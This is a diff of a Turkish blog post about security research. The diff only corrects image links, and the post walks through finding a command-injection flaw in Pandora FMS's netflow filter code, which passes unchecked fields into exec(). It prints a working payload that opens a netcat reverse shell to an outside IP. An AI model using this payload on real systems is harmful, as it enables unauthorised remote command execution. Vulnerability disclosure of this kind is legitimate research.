@@ -25,11 +25,11 @@ Profesyonel bir kaynak kod analizicisi değilim bu sebeple zafiyet bulmanın ken
 
 Sanal makineye giriş yapmak için dağımtıcının kendi sağladığı [kılavuz](https://pandorafms.com/downloads/guias_rapidas_EN.pdf) üzerinden root:pandora giriş bilgisini aldım ve sisteme giriş yaptım.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms.png)
 
 Sistem üzerinde biraz gezindikten sonra, uygulamaya dair kodların varsayılan webservisi dizini olan /var/www/html dizininde tutulduğunu tespit ettim.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-kaynak.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-kaynak.png)
 
 Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini [TAR](https://wiki.ubuntu-tr.net/index.php?title=Tar_komutu_kullan%C4%B1m%C4%B1) ile sıkıştırdım ve SCP kullanarak ana makineme aktardım.
 
@@ -46,43 +46,43 @@ Statik kaynak kod analizlerinde komut çalıştırmaya dair bir zafiyet arıyors
 
 IDE üzerinde tüm projede bulunan php dosyalarında yukarıda belirttiğim fonksiyonları aramaya başladım ve boşa çabalanan bir kaç saatin sonunda **functions_netflow.php** dosyasının 648\. satırında zafiyete dair çok umut vaadeden bir nokta tespit ettim.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-finding-point.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-finding-point.png)
 
 Hem **exec()** fonksiyonu kullanılıyor hemde henüz nerenden geldiği belli olmayan ama ben kullanıcıdan geliyorum diye bağıran bir değişkeni içeriyordu. Fazla Kemal Sunal izlemenin etkisinden olacak "Şimdi istanbul hapı yuttu" diye aklımdan geçirerek **$command** değişkeninin nereden geldiğini kurculamaya başladım.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-command.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-command.png)
 
 **$command** değişkeni **net_flow_getcommand()** fonksiyonundan geliyor, daha sonrada önceden tanımlanmış ekstra bir kaç komutta üstüne ekleniyordu. IDE'nin arama özelliğini kullanarak fonksiyonun aynı dosyada 892.nci satırda tanımlandığını tespit ettim.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-netflow-fonksiyon.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-netflow-fonksiyon.png)
 
 Fonksiyonu inclediğimde maalesef kullanıcıdan gelen herhangi bir verinin burada **$command** değişkenine maalesef eklenmediğini gördüm.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-netflow-fonksiyon-ayrinti.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-netflow-fonksiyon-ayrinti.png)
 
 Fakat bereket olsun, **$command** değişkenine bir şeyler ekleyen yeni fonksiyon çıktı karşıma 904\. satırda bulunan **netflow_get_filter_arguments** fonksiyonu. IDE üzerinden fonksiyonun tanımlandığı noktayı tespit ettim (aynı dosya 917\. satır) ve fonksiyonu incelemeye koyuldum.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-getfilter-fonksiyon.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-getfilter-fonksiyon.png)
 
 Fonksiyon bir sürü farklı girdiyi(ipsrc, ipdst, srcport, dstport) herhangi bir kontrolden geçirmeden **$filter_args** adında bir değişkene ekliyor ve en sonunda **$filter_args** değişkenini değer olarak dönüyordu. Daha sonra bu değer, **$command** değişkenine ekleniyor ve ilk tespit edilen satırda bulunan **exec()** fonksiyonuna gönderiliyordu. Yani eğer bu değişkenlerden herhangi birine istediğimiz girdiyi verebilirsek pekala buradan bir RCE elde edebiliriz. Aslında aradığım şey $_GET yada $_POST şekilinde kullanıcıdan alınan bir girdiydi fakat bu değişkenlerin hiç birinin geleneksel GET yada POST ile alındığını tespit edemedim. RCE hem çok yakındı hemde çok uzak. Bu durum canımı oldukça sıkmış olsada fonksiyonun içinde bulunan değerlerin mantıksal olarak kullanıcıdan alınması gerekiyordu. Uzunca bir süre bu değişkenlerin nasıl alındığı tespit etmeye çalıştım fakat bir sonuca varamadım. Biraz kafa toplamak amacıyla mola verdim. Bu noktada aslında yine bir şey bulamadığımı düşünüp bırakacaktım ki, aykırı bir tutum sergileyerek Googleda ufak bir arama yaptım.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-google.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-google.png)
 
 Buradan dökümanları okumanın ne kadar önemli olduğunu tekrar alıyoruz. Site üzerinde biraz gezindikten sonra, heyecanımı tekrar kazandıran bir ekran görüntüsüne denk geldim
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-google-netflow-dokuman.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-google-netflow-dokuman.png)
 
 Burada ki gösterilen girdiler fonksiyonun içinde tespit ettiğimiz (ipsrc, ipdst, srcport, dstport) değişkenleriydi, yani RCE zafiyetini tetiklememiz için kontrol etmemiz gereken değişkenler. Hemen dökümanı takip ederek, tarayıcı üzerinden ilgili sayfaya eriştim:
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-netflow-page.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-netflow-page.png)
 
 Girdilerin gönderildiği noktalarının tespitinin ardından, kalan son iş uygun payloadı oluşturmaktı. Fonksiyonları tekrar inceledim, **netflow_get_filter_arguments** fonksiyonun sonunda **$filter_args** değişkenine `"` karakteri eklediğini gördüm.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-son-dokunuslar.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-son-dokunuslar.png)
 
 Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi. Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak. Taslağın arasına ufak bir reverseshell komutu iliştirmek için [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) den bir reverseshell komutu aldım. Ve sonuç payloadı: **";nc -e /bin/sh 192.168.1.100 1234 #** olarak oluştu. Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde bir shell eldesi sağladım.
 
-![]({{ AUCyberClub.github.io }}(/assets/img/pandorafms/pandorafms-son.png)
+![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-son.png)
 
 Dağıtımcıya ulaşmaya çalıştım fakat bir sonuç alamadım. Bu nedenle makaleyi açık olarak yayınladım.
 
